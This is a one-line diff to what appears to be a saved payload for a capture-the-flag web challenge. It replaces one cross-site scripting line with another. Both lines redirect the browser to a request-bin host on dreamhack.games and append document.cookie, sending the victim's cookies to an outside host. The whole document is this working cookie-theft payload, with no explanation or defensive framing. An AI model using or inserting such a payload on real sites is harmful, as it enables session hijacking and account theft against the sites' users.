@@ -1,1 +1,1 @@
-location.href="https://ivjwdvm.request.dreamhack.games?memo="+document.cookie;
+location.href="https://tbplarx.request.dreamhack.games?memo="+document.cookie;
